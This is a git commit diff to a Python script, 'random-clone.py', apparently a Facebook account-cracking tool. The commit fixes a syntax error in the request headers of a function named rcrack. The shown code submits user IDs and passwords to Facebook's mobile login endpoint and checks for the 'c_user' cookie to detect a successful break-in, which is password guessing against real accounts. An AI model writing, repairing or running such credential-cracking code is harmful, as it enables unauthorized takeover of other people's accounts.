893a82d5f4901dad84e5a46f51bb8b3d9cf6dced
Termux-nihan <135256106+Termux-nihan@users.noreply.github.com>
2023-08-13 23:13:39 +0600

    Add files via upload

--- random-clone.py
+++ random-clone.py
@@ -177,7 +177,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent':pro)}
+            'user-agent':pro}
             lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
